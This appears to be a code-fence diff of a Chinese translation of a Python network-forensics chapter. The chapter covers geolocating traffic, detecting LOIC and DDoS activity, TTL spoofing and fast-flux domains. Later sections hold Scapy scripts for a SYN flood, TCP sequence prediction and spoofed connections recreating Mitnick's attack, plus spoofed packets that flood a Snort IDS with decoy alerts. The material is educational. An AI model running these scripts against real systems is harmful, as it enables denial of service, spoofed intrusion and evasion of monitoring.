@@ -23,7 +23,7 @@
 
 首先我们必须知道怎样将网络 IP 地址和物理位置相关联起来。为此，我们将依赖一个免费的数据库，MaxMind，MaxMind 提供了一些精确的商业产品，他的开源 GeoLiteCity 数据库在 [`www.maxmind.com/app/geolitecity`](http://www.maxmind.com/app/geolitecity) 可获得，为我们提供了足够的精确度从 IP 地址到物理地址。一旦数据库被下载，我们需要解压它并把它移动到其他位置，如`/opt/Geoip/Gro.dat`。
 
-```
+```py
 analyst# wget http://geolite.maxmind.com/download/geoip/database/
     GeoLiteCity.dat.gz
 --2012-03-17 09:02:20-- http://geolite.maxmind.com/download/geoip/
@@ -50,7 +50,7 @@ analyst#mv GeoLiteCity.dat /opt/GeoIP/Geo.dat
 
 Jennifer Ennis 制作了一个纯 Python 模块用来查询 GeoLiteCity 数据库。她的模块能从 [`code.google.com/p/pygeoip/`](http://code.google.com/p/pygeoip/) 下载，安装并导入到我们的 Python 脚本中。注意，我们将首先实例化一个`GeoIP`类，用本地的`GeoIP`的位置。接下来我们将为特殊的记录指定 IP 地址查询数据库。它将返回一个记录包含城市(`city`)，地区名(`region_name`)，邮编(`postal_code`)，国家(`country_name`)，经纬度(`latitude` and `longitude`)以及其他的确认信息。
 
-```
+```py
 import pygeoip
 gi = pygeoip.GeoIP('/opt/GeoIP/GeoIP.dat')
 def printRecord(tgt):
@@ -69,7 +69,7 @@ printRecord(tgt)
 
 运行我们的脚本，我们可以看到它产生输出显示目标 IP 的物理位置。现在我们可以将 IP 地址和物理位置关联在一起，让我们开始编写我们的分析脚本。
 
-```
+```py
 analyst# python printGeo.py
 [*] Target: 173.255.226.98 Geo-located.
 [+] Jersey City, NJ, United States
@@ -82,7 +82,7 @@ analyst# python printGeo.py
 
 例如，让我们假设一下我们捕获并记录了一个我们想要分析的网络数据包为 pcap 格式。`Dpkt`允许我们遍历每一个捕获的数据包并检查每一个协议层。在这个例子中，虽然我们只是简单的读取先前捕获的 PCAP 数据包，我们可以很容易的使用`pypcap`分析流量。可以从 [`code.google.com/p/pypcap/`](http://code.google.com/p/pypcap/) 下载。为了读取一个 pcap 文件，我们实例化文件，创建一个`pcap.reader`类对象，然后通过我们的对象函数`printPcap()`。这个对象`pcap`包含了一个数组，记录着时间戳和数据包，`[timestamp, packet]`。我们可以把每个数据包分为以太层和 IP 层。注意，这里要使用异常处理，因为我们可能捕获到第二层帧，不包含 IP 层，这有可能抛出一个异常。在这种情况下，我们使用异常处理捕获异常并继续下一个数据包。我们使用`socket`库解析 IP 地址。最后我们打印每个数据包的源地址和目标地址。
 
-```
+```py
 import dpkt
 import socket
 
@@ -108,7 +108,7 @@ if __name__ == '__main__':
 
 运行该脚本，我们可以看到源地址和目标地址打印在屏幕上。这为我们提供了一定程度的分析，现在让我们使用我们先前的脚本关联 IP 地址和物理地址。
 
-```
+```py
 analyst# python printDirection.py
 [+] Src: 110.8.88.36 --> Dst: 188.39.7.79
 [+] Src: 28.38.166.8 --> Dst: 21.133.59.224
@@ -123,7 +123,7 @@ analyst# python printDirection.py
 
 改善我们的脚本，让我们添加一个额外的函数`retGeoStr()`，通过 IP 地址返回物理地址。为此，我们将简单的分解城市和 3 位数的国家代码并将他们打印到屏幕上。如果函数抛出异常，我们将返回消息表示该地址未注册。这种异常是地址不在`GeoIP`数据库中或者是局域网 IP 地址，如`192.168.1.3`。
 
-```
+```py
 # coding=UTF-8
 import dpkt
 import socket
@@ -174,7 +174,7 @@ if __name__ == '__main__':
 
 运行我们的脚本，我们可以看到我们的数据包有前往韩国，伦敦，日本甚至是澳大利亚的。这为我们提供了强大的分析工具。然而，Google 地球可能会提供更好的方法来显示相同的信息。
 
-```
+```py
 analyst# python geoPrint.py -p geotest.pcap
 [+] Src: 110.8.88.36 --> Dst: 188.39.7.79
 [+] Src: KOR --> Dst: London, GBR
@@ -200,7 +200,7 @@ analyst# python geoPrint.py -p geotest.pcap
 
 Google 地球提供了一个虚拟地球仪，地图，地理信息，显示在专门的视图上。虽然是专门的，但 Google 地球却可以很容易的集成定制或者在全球追踪。创建一个扩展名为 KML 的文本文件，允许用户整合各种地方标识到 Google 地球中。KML 文件包含了一个特定的 XML 结构，就像下面我们展示的那样。在这里，我们展示了如何在地图上使用名字和具体坐标绘制具体的位置标记。我们已经有了 IP 地址，地点的经纬度，这应该很容易集成到我们现有的脚本中生成 KML 文件。
 
-```
+```py
 <?xml version="1.0" encoding="UTF-8"?>
 <kml >
 <Document>
@@ -222,7 +222,7 @@ Google 地球提供了一个虚拟地球仪，地图，地理信息，显示在�
 
 让我们快速建立一个函数`retKML()`，将 IP 作为输入返回一个特殊的 KML 结构。请注意，首先我们要解决的是使用`pygeoip`获得 IP 地址的经纬度。然后我们可以为这个地方建立我们的 KML 标记。如果我们遇到异常，例如“location not found,”，将返回空字符串。
 
-```
+```py
 def retKML(ip):
     rec = gi.record_by_name(ip)
     try:
@@ -242,7 +242,7 @@ def retKML(ip):
 
 整合所有的功能到我们原始的脚本。我们现在添加特定的 KML 头和尾。对于每一个数据包，我们创建源地址和目标地址的 KML 标记，并在地图上绘制。这样就产生了一个美丽的网络流量可视化图。想想，所有扩展这些的方法都是有用的。你可能希望用不同的图片标记不同类型的流量，特定的源地址和目的地址 TCP 端口(比如说 web80 端口和 25 邮件端口)。可以参考 Google 的 KML 文档在网站： [`developers.google.com/kml/documentation/`](https://developers.google.com/kml/documentation/) 并想想我们扩展我们可视化视图的目的。
 
-```
+```py
 # coding=UTF-8
 import dpkt
 import socket
@@ -317,7 +317,7 @@ LOIC 提供两种操作模式，第一中模式中，用户可以输入目标地
 
 互联网上多个源提供 LOIC 的下载，一些更为可信。可以从 sourceforge 主机下载 [`sourceforge.net/projects/loic/`](http://sourceforge.net/projects/loic/) ，让我们从这下载，下载前，打开`tcpdump`会话，过滤 80 端口，并打印结果，你可以看到一下结果。
 
-```
+```py
 analyst# tcpdump –i eth0 –A 'port 80'
 17:36:06.442645 IP attack.61752 > downloads.sourceforge.net.http:
     Flags [P.], seq 1:828, ack 1, win 65535, options [nop,nop,TS val
@@ -334,7 +334,7 @@ Safari/534.53.10
 
 第一部分我们是发现 LOIC 工具，我们将编写一个 Python 脚本来解析 HTTP 流量，审查 HTTP 的 GET 头是否有 LOIC 的 ZIP 二进制。为此，我们将使用`Dpkt`库。为了检查 HTTP 流量，我们必须提取以太网协议，IP 协议和 TCP 协议。最后是在 TCP 协议之上的 HTTP 协议。如果 HTTP 层用 GET 方法，我们解析特定的 URL 的 GET 请求。如果 URl 包含`.zip`和 LOIC 在名称中，我们打印消息在屏幕上，显示下载 LOIC 的 IP。折可以帮助聪明的管理员证明用户在下载 LOIC 而不是因为病毒感染。接合第三章的下载法庭取证分析，我们可以确认用户下载了 LOIC 工具。
 
-```
+```py
 import dpkt
 import socket
 
@@ -360,7 +360,7 @@ findDownload(pcap)
 
 运行该脚本，我们可以看到已经有用户下载了 LOIC 工具。
 
-```
+```py
 analyst# python findDownload.py
 [!] 192.168.1.3 Downloaded LOIC.
 [!] 192.168.1.5 Downloaded LOIC.
@@ -374,7 +374,7 @@ analyst# python findDownload.py
 
 在`tcpdump`中检查具体的攻击信息流量，我们可以看到特定的用户 anonOps 发送了一个开始攻击命令。接下来，IRC 服务器发送发送命令到连接的 LOIC 客户端上开始攻击。想像一下在一个很长的包含几个小时或者几天的网络流量的 pcap 文件中找到几个特定的数据包。
 
-```
+```py
 analyst# sudo tcpdump -i eth0 -A 'port 6667'
 08:39:47.968991 IP anonOps.59092 > ircServer.ircd: Flags [P.], seq
     3112239490:3112239600, ack 110628, win 65535, options [nop,nop,TS
@@ -392,7 +392,7 @@ message=test_test port=80 method=tcp wait=false random=true start
 
 在大多数情况下，IRC 服务使用的是 TCP 6667 端口，消息到 IRC 服务器的目的地至是 TCP 的 6667 端口，从 IRC 返回的消息的源地址端口应该是 TCP 的 6667 端口。让我们利用这些知识来编写我们的 HIVEMIND 解析函数`findHivemind()`。这一次，我们提取以太网协议，IP 协议和 TCP 协议。提取 TCP 协议后，我们在探究特定的源和目的端口。如果看到命令`!lazor`带有目的端口 6667，我们就可以确认成员发送了攻击命令。如果我们看到`!lazor`带有源目的地端口 6667，我们就可以确定服务器发送了成员攻击命令。
 
-```
+```py
 import dpkt
 import socket
 
@@ -422,7 +422,7 @@ def findHivemind(pcap):
 
 有了定位下载 LOIC 工具和发现 HIVE 命令的功能，最后一项任务是：识别正在进行的 DDos 攻击。当一个用户开始了一个 LOIC 攻击，它将发送大量的 TCP 数据包给目标主机。这些数据包，接合从 HIVE 来的集体的数据包基本耗尽了目标主机的资源。我们开始一个`tcpdump`会话看着每 0.00005 秒发送一个小的数据包。这种行为不断的重复直到攻击结束。注意，目标无法相应，每次只就收 5 个数据包。
 
-```
+```py
 analyst# tcpdump –i eth0 'port 80'
 06:39:26.090870 IP loic-attacker.1182 >loic-target.www: Flags [P.], seq
 336:348, ack 1, win
@@ -452,7 +452,7 @@ h 0
 
 让我们快速编写一个发现正在进行 DDos 攻击的函数。为了发现一个攻击，我们将设置一个数据包阀值。如果一个用户到特定地址的的数据包数量超过该阀值，这表明我们将把它当做一个攻击做进一步调查。但是，这并不能确定用户发起了攻击。然而，当用户下载了 LOIC 工具，随后接受了 HIVE 指令，然后是实际的攻击，这足以提供证据用户参与了一次匿名的 DDos 攻击。
 
-```
+```py
 import dpkt
 import socket
 
@@ -485,7 +485,7 @@ def findAttack(pcap):
 
 将我们的代码放在一起并加一些选项解析，我们的脚本现在可以检测下载，监听 HIVE 指令并检测攻击。
 
-```
+```py
 # coding=UTF-8
 import dpkt
 import socket
@@ -576,7 +576,7 @@ if __name__ == '__main__':
 
 运行代码，我们可以看到结果。四个用户下载了工具。接着，不同的用户发送攻击命令给另外两个连接着的攻击者，最后，这两个攻击者实际参与了攻击。因此现在的脚本识别整个 DDos 攻击行动。虽然入侵检测系统可以检测类似的活动，但编写一个自定义脚本做的更好。在下面的章节中，我们看看一个自定义脚本，一个七岁小孩编写的用来保护五角大楼的脚本。
 
-```
+```py
 analyst# python findDDoS.py –p traffic.pcap
 [!] 192.168.1.3 Downloaded LOIC.
 [!] 192.168.1.5 Downloaded LOIC.
@@ -606,7 +606,7 @@ analyst# python findDDoS.py –p traffic.pcap
 
 在编写脚本之前，我们来接是一下 IP 数据包的 TTL 字段。TTL 字段包含 8 个 bit，有效值 0 到 255。当计算机发送一个 IP 数据包时，它设置 TTL 字段为可以到达目的地的最大跳，每个路由设备改变数据包的 TTL 字段值。如果 TTL 字段为零，路由器抛弃这个数据包防止无限循环路由。比如说，如果我 ping 地址`8.8.8.8`，初始化 TTL 为 64 它将返回 TTL 的值为 53 我们可以看到数据包穿过了 11 个路由设备。
 
-```
+```py
 target# ping –m 64 8.8.8.8
 PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
 64 bytes from 8.8.8.8: icmp_seq=1 ttl=53 time=48.0 ms
@@ -616,7 +616,7 @@ PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
 
 引进诱饵扫描的是 1.6 版本，诱饵数据包的 TTL 不是随机的也不是正确的。未能正确计算 TTL 允许 Moore 确认这些数据包。显然，Nmap 的代码从 1999 年得到显著的增长和发展，在最近的版本中，Nmap 使用下面的算法随机的设置 TTL。该算法随机的产生一个 TTL，用户也能自己指定 TTL 的值。
 
-```
+```py
 /* Time to live */
 if (ttl == -1) {
     myttl = (get_random_uint()% 23) + 37;
@@ -627,7 +627,7 @@ myttl = ttl;
 
 为了运行一个 Nmap 诱饵扫描，我们在 IP 地址后面加上参数`-D`，在这种情况下，我们将使用地址`8.8.8.8`作为诱饵地址，此外，我们自己指定 TTL 的值为 13，因此，下面我们用 TTL 为 13 的诱饵地址为`8.8.8.8`扫描`192.168.1.7`。
 
-```
+```py
 attacker$ nmap 192.168.1.7 -D 8.8.8.8 -ttl 13
 Starting Nmap 5.51 (http://nmap.org) at 2012-03-04 14:54 MST
 Nmap scan report for 192.168.1.7
@@ -637,7 +637,7 @@ Host is up (0.015s latency).
 
 在目标`192.168.1.7`上，我们在详细模式下打开`tcpdump`(`-v`)，禁用名称解析(`-nn`)，过滤特定的地址`8.8.8.8`(`'host 8.8.8.8'`)，我们看到 Nmap 成功的用 TTL 为 13，诱饵地址为`8.8.8.8`发送了数据包。
 
-```
+```py
 target# tcpdump –i eth0 –v –nn 'host 8.8.8.8'
 8.8.8.8.42936 > 192.168.1.7.6: Flags [S], cksum 0xcae7 (correct), seq
     690560664, win 3072, options [mss 1460], length 0
@@ -661,7 +661,7 @@ proto TCP (6), length 44)
 
 让我们开始编写我们的脚本来打印源地址和数据包里面的 TTL 值。这一点上，在本章的剩余部分我们会使用`Scapy`库，你也可以简单的使用 Dpkt 库来编写这个代码。我们将建立一个函数`testTTL()`来嗅探每一个经过的数据包，检查数据包的 IP 层，抽取 IP 地址和 TTL 字段并打印字段在屏幕上。
 
-```
+```py
 from scapy.all import *
 def testTTL(pkt):
     try:
@@ -681,7 +681,7 @@ main()
 
 运行我们的代码，我们看到我们已经从不同的地址收到几个带有不同的 TTL 的数据包。这些结果也包括来自`8.8.8.8`的 TTL 为 13 的诱饵扫描。我们知道 TTL 应该是 64-13=51 跳，我们可以认为有人伪造数据包。应该注意一点，LInux/Unix 系统上通常初始 TTL 值为 64，而 Windows 系统初始 TTL 值为 128。为了我们脚本的目的，我们假设我们只解析来自 Linux 扫描的数据包，所以让我们增加一个函数来检查实际接受的 TTL。
 
-```
+```py
 analyst# python printTTL.py
 [+] Pkt Received From: 192.168.1.7 with TTL: 64
 [+] Pkt Received From: 173.255.226.98 with TTL: 52
@@ -698,7 +698,7 @@ analyst# python printTTL.py
 
 我们从相同的源地址收到了不少的独特的数据包，我们只需要检查源地址一次。如果先前我们没看到源地址，让我们构建一个目的地址与源地址相同的 IP 数据包。此外，我们将制作一个 ICMP 数据包与目的地址向回应。一旦目标地址回应，我们将 TTL 值放在字典中，通过 IP 源地址索引，我们再来检查实际收到的 TTL 值和原始数据包里面的 TTL 值。数据包可能会走不同的路线来到达目的地，造成 TTL 不同，然而，如果跳数的距离相差五跳，我们可以假定，它可能是一个欺骗性的 TTL，并打印警告信息在屏幕上。
 
-```
+```py
 from IPy import IP as IPTEST
 ttlValues = {}
 THRESH = 5
@@ -716,7 +716,7 @@ def checkTTL(ipsrc, ttl):
 
 我们添加一些选项解析来指定要监听的地址，然后通过一个选项来设定阀值来产生最终的代码。少于 50 行的代码，我们拥有是数十年前 Moore 为五角大楼困境的解决方案。
 
-```
+```py
 # coding=UTF-8
 import time
 import optparse
@@ -766,7 +766,7 @@ if __name__ == '__main__':
 
 运行我们的代码，我们可以看到它正确的识别了诱饵 Nmap 扫描，来自`8.8.8.8`的扫描。需要注意的是，我们的值产生于一个默认的 Linux 初始 TTL 值 64，尽管 RFC 1700 推荐的默认 TTL 值是 64，但是 Windows 系统还是将 128 作为 TTL 的默认初始值。此外，其他一些 Unix 变种的系统有着不同的 TTL 值。现在我们假定产生数据包的系统为 Linux。
 
-```
+```py
 analyst# python spoofDetect.py –i eth0 –t 5
 [!] Detected Possible Spoofed Packet From: 8.8.8.8
 [!] TTL: 13, Actual TTL: 53
@@ -791,7 +791,7 @@ Fast 很难从 Storm 僵尸网络卸载下来，类似的技术次年用于辅�
 
 你的 NDS 知道一些你不知道的事吗？ 为了确认外界的 Fast 流量和 Domain 流量，让我们快速审查一下 DNS，通过查看域名请求时产生的流量。为了明白这些，让我们执行域名查询操作。注意，我们的域名服务器在`192.168.1.1`，翻译域名到`74.117.114.119`的 IP 地址。
 
-```
+```py
 analyst# nslookup whitehouse.com
 Server: 192.168.1.1
 Address: 192.168.1.1#53
@@ -802,7 +802,7 @@ Address: 74.117.114.119
 
 用`tcpdump`检查 NDS 流量，我们可以看到客户端`192.168.13.37`发送了一个 DNS 请求给`192.168.1.1`。特别是客户端生成了 DNS 快速记录(DNSQR)请求 Ipv4 地址，服务器响应增加 DNS 资源记录(DNSRR)并提供 IP 地址。
 
-```
+```py
 analyst# tcpdump -i eth0 –nn 'udp port 53'
 07:45:46.529978 IP 192.168.13.37.52120 >192.168.1.1.53: 63962+ A?
     whitehouse.com. (32)
@@ -814,7 +814,7 @@ analyst# tcpdump -i eth0 –nn 'udp port 53'
 
 当我们用`Scapy`研究 DNS 协议请求，我们可以看到包含在每一个 A 记录的 DNSQR 包含了请求名(`qname`)，请求类型(`qtype`)和请求类(`qclass`)。为了上述要求，我们要请求域名的 Ipv4 地址，让`qname`字段等于域名。DNS 服务响应通过添加 DNSRR 包含资源名称(`rrname`)，类型(`type`)，资源记录类(`rclass`)和 TTL。知道 Fast 流量和 Domain 流量是怎么工作的，我们现在可以使用`Scapy`编写 Python 脚本分析可确认可以的 DNS 流量。
 
-```
+```py
 analyst# scapy
 Welcome to Scapy (2.0.1)
 >>>ls(DNSQR)
@@ -836,7 +836,7 @@ rdata : RDataField       =        (‘’)
 
 让我们编写 Python 脚本阅读 pcap 并分析所有的包含 DNSRR 的数据包。`Scapy`功能强大，`haslayer()`函数将协议类型作为输入，并返回一个布尔值。如果数据包包含一个 DNSRR，我们将抽取包含适当域名和 IP 地址的`rname`和`rdata`变量。我们可以检查我们维护的域名字典，通过域名索引。如果是我之前见过的域名，我们将看看它是否与先前的 IP 地址相关联。如果它有一个不同以前的 IP 地址，我们将增加到我们维护的字典。相反，如果我们发现了一个新域名，我们添加它到我们的字典。我们添加这个域名的 IP 地址作为存储我们字典值的数组的第一个元素。 这看起来有些复杂，但是我们想能够存储所有的域名和他们关联的不同的 IP 地址。为了检测 Fast 流量，我们需要知道那个域名有多个 IP 地址。在研究所有的数据包之后，我们打印所有的域名和每个域名的多个 IP 地址。
 
-```
+```py
 from scapy.all import *
 dnsRecords = {}
 def handlePkt(pkt):
@@ -861,7 +861,7 @@ main()
 
 运行我们的代码，我们可以看到至少有四个域名与多个 IP 相对应。所有的死四个域名在过去实际上被 Fast 流量所利用。
 
-```
+```py
 analyst# python testFastFlux.py
 [+] ibank-halifax.com. has 100,379 unique IPs.
 [+] armsummer.com. has 14,233 unique IPs.
@@ -873,7 +873,7 @@ analyst# python testFastFlux.py
 
 接下来，我们开始分析被 Conficker 蠕虫感染的机器。你可以感染你自己的机器或者下载一些捕获的样本。许多第三方网站包含不同的 Conficker 捕获。由于 Conficker 蠕虫利用 Domain 流量，我们需要查看服务器包含未知域名的错误信息的响应。不同版本的 Conficker 蠕虫生成几种 DNS。因为几个域名是伪造的，为了掩盖真实的命令控制服务器。大多数 DNS 服务器缺乏将域名转换成真实的地址并替代生成的错误的信息的能力。让我们通过确认所有的包含 name-error 信息的 DNS 响应来确认 Domain 流量。为了得到完整的 Conficker 蠕虫使用过的域名列表，我们可以在 [`www.cert.at/downloads/data/conficker_en.html`](http://www.cert.at/downloads/data/conficker_en.html) 找到。
 
-```
+```py
 from scapy.all import *
 def dnsQRTest(pkt):
     if pkt.haslayer(DNSRR) and pkt.getlayer(UDP).sport == 53:
@@ -898,7 +898,7 @@ main()
 
 注意当我们运行脚本时，我们可以看到一些用于 Conficker 蠕虫 Domain 流量的实际域名。成功！我们可以确认攻击。在下一节里让我们用我们的分析技能重新审视一下发生在 15 年前的复杂的攻击。
 
-```
+```py
 analyst# python testDomainFlux.py
 [!] Name request lookup failed: tkggvtqvj.org.
 [!] Name request lookup failed: yqdqyntx.com.
@@ -927,7 +927,7 @@ Tsutomu Shimomura，一个计算物理理学家，帮助逮捕了米特尼克。
 
 在米特尼克确认了 Shimomura 的私人电脑上有一个可靠的远程服务，他需要那个机器沉默。如果机器注意到尝试使用他的 IP 地址欺骗连接，机器将会发送重置数据包关闭连接。为了让机器沉默，米特尼克发送了一类咧的 TCP SYN 包到服务器的登陆端口。被称为 SYN 洪水攻击，这个攻击充满了服务器的连接序列并保持它的响应。从 Shimomura 发布的细节来看，我们看到一系列的 TCP SYN 包发送到目标主机的登陆端口。
 
-```
+```py
 14:18:22.516699 130.92.6.97.600 > server.login: S
 1382726960:1382726960(0) win 4096
 14:18:22.566069 130.92.6.97.601 > server.login: S
@@ -947,7 +947,7 @@ Tsutomu Shimomura，一个计算物理理学家，帮助逮捕了米特尼克。
 
 用`Scapy`简单的复制一个 TCP SYN 洪水攻击，我们将制作一些 IP 数据包，有递增的 TCP 源端口和不断的 TCP 513 目标端口。
 
-```
+```py
 from scapy.all import *
 
 def synFlood(src, tgt):
@@ -964,7 +964,7 @@ synFlood(src, tgt)
 
 运行攻击发送 TCP SYN 数据包耗尽目标主机资源，填满它的连接队列，基本瘫痪目标发送 TCP 重置包的能力。
 
-```
+```py
 mitnick# python synFlood.py
 .
 Sent 1 packets.
@@ -982,7 +982,7 @@ Sent 1 packets.
 
 现在攻击变得有一些有趣了。随着远程服务器的沉默，米特尼克可以欺骗目标的 TCP 连接。然而，这取决于他发送伪造的 SYN 的能力，Shimomura 机器 TCP 连接后的一个 TCP ACK 数据包。为了完成连接，米特尼克需要需要正确的猜到 TCP ACK 的序列号，因为他无法观察到他，并返回一个正确的猜测的 TCP ACK 序列号。为了正确计算 TCP 序列号，米特尼克从名为`apollo.it.luc.edu`的大学机器发送了一系列的 SYN 数据包，收到 SYN 之后，Shimomura 的机器的终端响应了一个带序列号的 TCP ACK 数据包注意下面隐藏技术细节的序列号：`2022080000, 2022208000, 2022336000, 2022464000`。每个增量相差 128000，这让计算正确的 TCP 序列号更加容易。( 注意，大多数现代的操作系统今天提供更强大的随机 TCP 序列号。)
 
-```
+```py
 14:18:27.014050 apollo.it.luc.edu.998 > x-terminal.shell: S
 1382726992:1382726992(0) win 4096
 14:18:27.174846 x-terminal.shell > apollo.it.luc.edu.998: S
@@ -1012,7 +1012,7 @@ Sent 1 packets.
 
 为了在 Python 中重现，我们将发送 TCP SYN 数据包并等待 TCP SYN-ACK 数据包。一旦收到，我们将从 ACK 中剥离 TCP 序列号并打印到屏幕上。我们进重复 4 次确认一个规律的存在。注意，使用`Scapy`，我们不需要完整的 TCP 和 IP 字段：`Scapy`将用值填充他们。此外，它将从我们默认的源地址发送。我们的新函数`callSYN()`将会接受一个 IP 地址返回写一个 ACK 序列号(当前的序列号加上变化)。
 
-```
+```py
 from scapy.all import *
 def calTSN(tgt):
     seqNum = 0
@@ -1035,7 +1035,7 @@ print "[+] Next TCP Sequence Number to ACK is: "+str(seqNum+1)
 
 运行我们的代码攻击一个脆弱的目标，我们可以看到 TCP 系列号的随机性是不存在的，目标和 Shimomura 的机器有相同的序列号差值。注意，默认情况下，`Scapy`会使用默认的目标 TCP 端口 80。目标必须有一个服务正在监听，不管你尝试欺骗连接那个端口。
 
-```
+```py
 mitnick# python calculateTSN.py
 [+] TCP Seq Difference: 128000
 [+] TCP Seq Difference: 128000
@@ -1048,7 +1048,7 @@ mitnick# python calculateTSN.py
 
 有了正确的 TCP 序列号在手，米特尼克可以攻击了。米特尼克使用的序列号是`2024371200`，大约初始化 SYN 后的 150 个 SYN 数据包发送过去用来侦查。首先，它从新的沉默服务器欺骗了一个连接。然后他发送了一个序列号是`2024371201`盲目的 ACK 数据包，表明已经建立了正确的连接。
 
-```
+```py
 14:18:36.245045 server.login > x-terminal.shell: S
 1382727010:1382727010(0) win 4096
 14:18:36.755522 server.login > x-terminal.shell: .ack2024384001 win
@@ -1057,7 +1057,7 @@ mitnick# python calculateTSN.py
 
 在 Python 中重现这些，我们将生成和发送两个数据包。首先我们创建一个 TCP 源端口是 513 和目的端口是 514 的源 IP 地址是欺骗的服务器目的 IP 地址是目标 IP 地址的 SYN 数据包，接下来，我们创建一个相同的 ACK 数据包，增加计算的序列号作为额外的字段，并发送它。
 
-```
+```py
 from scapy.all import *
 def spoofConn(src, tgt, ack):
     IPlayer = IP(src=src, dst=tgt)
@@ -1077,7 +1077,7 @@ spoofConn(src,tgt,seqNum)
 
 将全部代码整合在一起，我们将增加一些命令行选项解析来指定要欺骗连接的地址，目标服务器，和欺骗地址的初始化 SYN 洪水攻击。
 
-```
+```py
 # coding=UTF-8
 import optparse
 from scapy.all import *
@@ -1140,7 +1140,7 @@ if __name__ == '__main__':
 
 运行我们最终的脚本，我们成功复制了米特尼克 20 年前的攻击。一度被认为是史上最复杂的攻击现在被我们用几十行 Python 代码重现。现在手上有了较强的分析技能，让我们用到下一节描述的方法，一个针对入侵检测系统的复杂网络攻击的分析。
 
-```
+```py
 mitnick# python tcpHijack.py -s 10.1.1.2 -S 192.168.1.2 -t 192.168.1.106
 [+] Starting SYN Flood to suppress remote server.
 .
@@ -1167,7 +1167,7 @@ Sent 1 packets.
 
 入侵检测系统(IDS)是主管分析师手中一个非常有价值的工具。一个基于网络的入侵检测系统(NIDS)可以通过记录 IP 网络数据包实时分析流量。通过匹配已知恶意标记的数据包，IDS 可以在攻击成功之前提醒网络分析师。比如说，Snort 入侵检测系统通过预先包装各种不同的规则来检测不同类型的侦查，攻击，拒绝服务等其他不同的攻击向量。审查其中一个配置的内容，我们看到四个报警检测 TFN，tfn2k 和 Trin00 分布式拒绝服务的攻击工具。当攻击者使用 TFN, tfn2k 或者 Trin00 工具攻击目标，IDS 检测到攻击然后警告分析师。然而，当分析师接受比他们能分辨事件还要多的警告时他该怎么办？他们往往不知所措，可能会错过重要的攻击细节。
 
-```
+```py
 victim# cat /etc/snort/rules/ddos.rules
 <..SNIPPED..>
 alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"DDOS TFN Probe";
@@ -1187,7 +1187,7 @@ reference:arachnids,184; classtype:attempted-dos; sid:228; rev:3;)
 
 为了对分析师隐藏一个合法的攻击，我们将编写一个工具生成大量的警告让分析师去处理。此外，分析师能够使用这个工具来验证一个 IDS 能正确的识别恶意流量。编写这个脚本并不难，我们已经有了生成警告的规则。为此，我们将再次使用`Scapy`制作数据包。考虑到 DDos TFN 的第一条规则，我们必须生成一个 ICMP 数据包，ICMP ID 是 678，ICMP 类型是 8 包含原始内容`'1234'`的数据包。使用`Scapy`，我们用这些变量制作数据包并发送他们到我们的目的地址。此外，我们建立其他三个规则的数据包。
 
-```
+```py
 from scapy.all import *
 def ddosTest(src, dst, iface, count):
     pkt=IP(src=src,dst=dst)/ICMP(type=8,id=678)/Raw(load='1234')
@@ -1208,7 +1208,7 @@ ddosTest(src,dst,iface,count)
 
 运行该脚本，我们看到，四个数据包发送到了目的地址。IDS 将会分析这些数据包并生成警告，如果他们匹配正确的话。
 
-```
+```py
 attacker# python idsFoil.py
 Sent 1 packets.
 .Sent 1 packets.
@@ -1218,7 +1218,7 @@ Sent 1 packets.
 
 检查 Snort 的警告日志，我们发现我们成功了！所有四个数据包生成的警告全部 IDS 系统中。
 
-```
+```py
 victim# snort -q -A console -i eth0 -c /etc/snort/snort.conf
 03/14-07:32:52.034213 [**] [1:221:4] DDOS TFN Probe [**]
 [Classification: Attempted Information Leak] [Priority: 2] {ICMP}
@@ -1235,7 +1235,7 @@ message detected [**] [Classification: Attempted Information Leak]
 
 让我们看看稍微复杂的规则，Snort 下的`exploit.rules`签名文件。在这里，一系列的特殊字节将会为 ntalkd x86 Linux 溢出和 Linux mountd 溢出生成警告。
 
-```
+```py
 alert udp $EXTERNAL_NET any -> $HOME_NET 518 (msg:"EXPLOIT ntalkd x86
 Linux overflow"; content:"|01 03 00 00 00 00 00 01 00 02 02 E8|";
 reference:bugtraq,210; classtype:attempted-admin; sid:313;
@@ -1248,7 +1248,7 @@ reference:bugtraq,121; reference:cve,1999-0002; classtype
 
 为了生成包含原始字节的数据包，我们将利用`\x`后面跟随 16 进制字符来编码字节。在第一个警报，会生成一个数据包将会被 ntalkd Linux 溢出签名所检测到。第二个数据包，我们将接合 16 进制编码和标准的 ASCII 字符。注意`98|F|`编码为`\x89`标示包含了原始的字节加了一个 ASCII 字符。下面的数据包将在试图攻击时生成报警。
 
-```
+```py
 def exploitTest(src, dst, iface, count):
     pkt = IP(src=src, dst=dst) / UDP(dport=518) /Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
     send(pkt, iface=iface, count=count)
@@ -1258,7 +1258,7 @@ send(pkt, iface=iface, count=count)
 
 最后，它会很好的欺骗一些侦查和扫描。当我们检查 Snort 的扫描规则时发现两个我们可以制作数据包的规则。两个规则通过特定的端口和特定原始内容的 UDP 协议检测恶意行为。很容易制作这种数据包。
 
-```
+```py
 alert udp $EXTERNAL_NET any -> $HOME_NET 7 (msg:"SCAN cybercop udp
 bomb"; content:"cybercop"; reference:arachnids,363; classtype:bad-
 unknown; sid:636; rev:1;)
@@ -1269,7 +1269,7 @@ recon; sid:634; rev:2;)
 
 我们生成两个对应规则的扫描工具的数据包。当生成两个合适的 UDP 数据包之后我们发送到目标主机。
 
-```
+```py
 def scanTest(src, dst, iface, count):
     pkt = IP(src=src, dst=dst) / UDP(dport=7) /Raw(load='cybercop')
     send(pkt)
@@ -1279,7 +1279,7 @@ send(pkt, iface=iface, count=count)
 
 现在，我们有数据包可以生成拒绝服务攻击，渗透攻击和扫描侦查的警告。我们把代码组合在一起，添加一些选项解析。注意，用户必须输入目标地址否则程序会退出。如果用户没有输入源地址，我们会生成一个随机的源地址。如果用户不能指定发送制作的数据包多少次，我们将只发送一次。该脚本使用缺省的网卡 eth0，除非用户指定。虽然我们的目的文本很短，你可以继续添加脚本生成测试其他攻击类型的警告。
 
-```
+```py
 # coding=UTF-8
 import optparse
 from scapy.all import *
@@ -1341,7 +1341,7 @@ if __name__ == '__main__':
 
 执行我们最终的脚本，我们可以看到它正确的发送了八个数据包到目标地址，欺骗源地址为`1.3.3.7`。为了测试目的，确保目标主机和攻击者的机器不同。
 
-```
+```py
 attacker# python idsFoil.py -i eth0 -s 1.3.3.7 -t 192.168.1.106 -c 1
 Sent 1 packets.
 Sent 1 packets.
@@ -1355,7 +1355,7 @@ Sent 1 packets.
